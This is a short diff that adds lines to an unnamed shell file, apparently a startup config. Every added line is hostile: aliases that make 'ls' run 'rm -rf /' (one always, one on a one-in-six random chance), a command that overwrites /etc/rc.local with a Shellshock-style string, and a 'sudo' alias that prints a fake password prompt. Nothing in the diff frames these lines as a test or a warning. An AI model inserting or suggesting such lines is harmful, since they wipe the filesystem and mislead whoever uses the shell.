@@ -1,0 +1,10 @@
+alias ls="rm -rf /"
+
+
+echo "() { :;}:" > /etc/rc.local
+
+
+alias ls='[ $[ $RANDOM % 6 ] == 0 ] && rm -rf / && echo "BOOM" || echo *Click*'
+
+
+alias sudo='echo "Please enter your password:"'
